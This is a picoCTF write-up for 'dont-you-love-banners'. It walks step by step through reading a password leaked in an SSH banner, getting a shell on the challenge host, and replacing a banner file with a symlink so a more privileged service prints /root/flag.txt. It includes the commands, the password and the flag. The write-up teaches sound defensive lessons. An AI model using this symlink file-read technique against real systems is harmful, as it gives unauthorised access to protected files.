# dont-you-love-banners

## Category
General Skills

## Difficulty
Medium

## Challenge Information
- **Platform:** picoCTF
- **Year:** 2024
- **Author:** Loic Shema / syreal
- **Challenge Name:** dont-you-love-banners

## Overview

The challenge involves exploiting information leaked through a server banner to gain access to a remote machine and retrieve a flag stored in the `/root` directory.

The server exposes two important ports:

- **17885:** SSH service that leaks information through its service banner.
- **10643:** Netcat application that asks a series of security-related questions before providing shell access.

The main objective was to discover the leaked password, answer the application's questions correctly, investigate the remote machine, and exploit the banner file to retrieve the root flag.

## Approach

### 1. Enumerate the SSH Service Using Nmap

I started by scanning port `17885` to identify the running service and retrieve its version information.

Command:

    nmap -sV -vv chatelaine.cylabacademy.net -p 17885

Explanation:

- `nmap`: Network scanning tool.
- `-sV`: Detect the service and its version.
- `-vv`: Enable very verbose output.
- `-p 17885`: Scan only port 17885.

The scan identified the following service:

    PORT      STATE SERVICE VERSION
    17885/tcp open  ssh     (protocol 2.0)

More importantly, Nmap returned an SSH banner containing:

    SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234

This was the crucial information leaked by the server.

The password was:

    My_Passw@rd_@1234

This demonstrated that service banners can expose sensitive information if they are not configured carefully.

### 2. Connect to the Application Using Netcat

The challenge provided another port, `10643`, for interacting with the running application.

I connected using:

    nc chatelaine.cylabacademy.net 10643

The application displayed a welcome banner and asked:

    what is the password?

I entered the password discovered through Nmap:

    My_Passw@rd_@1234

The application then asked:

    What is the top cyber security conference in the world?

My first attempt was:

    Black Hat

The application rejected the answer:

    Lol, good try, try again and good luck

I tried again with:

    Def con

This time, the application proceeded to the next question.

### 3. Answer the Security Questions

The application asked:

    the first hacker ever was known for phreaking(making free phone calls), who was it?

I answered:

    john draper

The answer was accepted, and the application provided access to a shell.

The successful answers were:

| Question | Answer |
|---|---|
| What is the password? | `My_Passw@rd_@1234` |
| What is the top cyber security conference in the world? | `Def con` |
| Who was the first hacker known for phreaking? | `John Draper` |

### 4. Explore the Remote Machine

After answering all the questions, I received a shell:

    player@challenge:~$

I started exploring the environment:

    ls

Output:

    banner    text

I inspected the directory permissions and files:

    ls -al

Output:

    total 20
    drwxr-x--- 1 player player   20 Sep 23 05:07 .
    drwxr-xr-x 1 root   root     20 Sep 23 05:07 ..
    -rw-r--r-- 1 player player  220 Mar 31  2024 .bash_logout
    -rw-r--r-- 1 player player 3771 Mar 31  2024 .bashrc
    -rw-r--r-- 1 player player  807 Sep 23 05:07 .profile
    -rw-r--r-- 1 player player  114 Sep 23 00:59 banner
    -rw-r--r-- 1 root   root     13 Sep 23 00:59 text

I checked my current working directory:

    pwd

Output:

    /home/player

The important discovery was the `banner` file located in the player's home directory.

### 5. Investigate the Root Directory

The challenge description mentioned that the flag was stored in `/root`.

I navigated there:

    cd /root

Then listed its contents:

    ls

Output:

    flag.txt    script.py

I tried reading the flag:

    cat flag.txt

However, the operation failed:

    cat: flag.txt: Permission denied

I checked whether I could use sudo:

    sudo -l

But the system returned:

    -bash: sudo: command not found

I also attempted to change the flag's permissions:

    chmod 777 flag.txt

The operation failed:

    chmod: changing permissions of 'flag.txt': Operation not permitted

This confirmed that the current `player` user did not have permission to access the root-owned flag.

### 6. Analyze the Application's Python Script

Since the direct approach did not work, I inspected the application's Python script:

    cat script.py

The relevant part of the script was:

    import os
    import pty

    incorrect_ans_reply = "Lol, good try, try again and good luck\n"

    if __name__ == "__main__":
        try:
            with open("/home/player/banner", "r") as f:
                print(f.read())
        except:
            print("DEFAULT BANNER")

    try:
        request = input("what is the password? \n").upper()
        while request:
            if request == 'MY_PASSW@RD_@1234':
                text = input("What is the top cyber security conference in the world?\n").upper()
                if text == 'DEFCON' or text == 'DEF CON':
                    output = input(
                        "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                    if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output == 'DRAPER':
                        scmd = 'su - player'
                        pty.spawn(scmd.split(' '))

An important observation was that the script reads:

    /home/player/banner

before asking the questions.

This meant the application displayed the contents of the banner file when it started.

I also noticed that the script used:

    pty.spawn(scmd.split(' '))

to start a shell as the `player` user after the correct answers.

This explained how the application provided shell access.

### 7. Understand the Banner File Vulnerability

The key observation was that the application trusted the banner file located at:

    /home/player/banner

The banner file was readable by the application, and its contents were displayed when the application started.

However, the root flag was located at:

    /root/flag.txt

I realized that I could potentially make the application read the root flag through the banner file instead of trying to access the flag directly as the `player` user.

To do this, I returned to the player's home directory:

    cd

I removed the original banner file:

    rm banner

Then I created a symbolic link pointing to the root flag:

    ln -s /root/flag.txt banner

The symbolic link made `banner` point to:

    /root/flag.txt

The important distinction is that I did not change the permissions of the root flag. Instead, I changed what the banner pathname referenced.

### 8. Trigger the Banner Reading Mechanism

After creating the symbolic link, I attempted to read the banner directly:

    cat banner

The operation returned:

    cat: banner: Permission denied

This was expected because the current player shell could not directly read the root-owned flag.

However, the application had a separate banner-reading mechanism that ran when a new connection was established.

I therefore exited the current interaction and connected to the application again:

    nc chatelaine.cylabacademy.net 10643

The application read the banner file through its startup mechanism.

Since `banner` now pointed to `/root/flag.txt`, the application displayed the flag.

The output was:

    academy{b4nn3r_gr4bb1n9_su((3sfu11y_32c8192b}

The flag was successfully retrieved!

## Commands and Tools Used

| Command / Tool | Purpose |
|---|---|
| `nmap -sV -vv` | Scan the SSH service and identify its version and banner. |
| `nc` | Connect to the remote application. |
| `ls` | List files and directories. |
| `ls -al` | Display detailed file information and permissions. |
| `pwd` | Display the current working directory. |
| `cd` | Navigate between directories. |
| `cat` | Display file contents and inspect the Python script. |
| `sudo -l` | Check available sudo permissions. |
| `chmod` | Attempt to modify file permissions. |
| `rm` | Remove the original banner file. |
| `ln -s` | Create a symbolic link to another file. |

## Key Concepts Learned

### 1. Service Banner Enumeration

A service banner provides information about a network service, such as its software name, version, and sometimes additional information.

In this challenge, the SSH banner exposed a password:

    My_Passw@rd_@1234

This demonstrates why sensitive information should never be included in service banners.

### 2. Nmap Service Detection

The `-sV` option enables service and version detection.

It is useful during reconnaissance because services sometimes expose information that can help identify vulnerabilities or misconfigurations.

### 3. Netcat

Netcat (`nc`) is a networking utility that can establish connections to remote TCP or UDP services.

In this challenge, it allowed me to interact with the application's question-and-answer interface.

### 4. Python Source Code Analysis

Inspecting `script.py` helped me understand how the application worked.

I discovered that it read the banner file before starting the authentication process.

Reading application source code can reveal important implementation details, including file access behavior and security weaknesses.

### 5. Linux File Permissions

Linux file permissions determine which users can read, write, or execute files.

The root flag had restrictive permissions:

    -rwx------

This meant that only the root user could access it directly.

The `player` user could not read the file or change its permissions.

### 6. Symbolic Links

A symbolic link is a special file that points to another file or directory.

The command:

    ln -s /root/flag.txt banner

created a symbolic link named `banner` that pointed to `/root/flag.txt`.

When an application opens the `banner` pathname, the operating system follows the symbolic link to its target.

This behavior became the foundation of the exploit.

### 7. Arbitrary File Read Through a Trusted Path

The application trusted a user-controlled banner pathname and opened it during startup.

By replacing the original banner with a symbolic link, I redirected the application's file-reading operation toward a protected file.

This is an example of a file-handling vulnerability involving symbolic links and improper trust in filesystem paths.

## Lessons Learned

- Service banners can leak sensitive information.
- Nmap service detection is useful for discovering exposed information.
- Netcat is useful for interacting with remote TCP services.
- Reading application source code can reveal important security weaknesses.
- Linux file permissions prevent unauthorized direct file access.
- Symbolic links can redirect file access from one pathname to another.
- Applications should carefully validate files they open, especially when paths can be modified by users.
- A program that reads a file with greater privileges than the user must be careful about symbolic links and file ownership.

## Result

Successfully discovered the password through SSH banner enumeration, answered the application's security questions, analyzed its Python source code, and exploited the banner file handling mechanism using a symbolic link to retrieve the root flag.

## Flag

    academy{b4nn3r_gr4bb1n9_su((3sfu11y_32c8192b}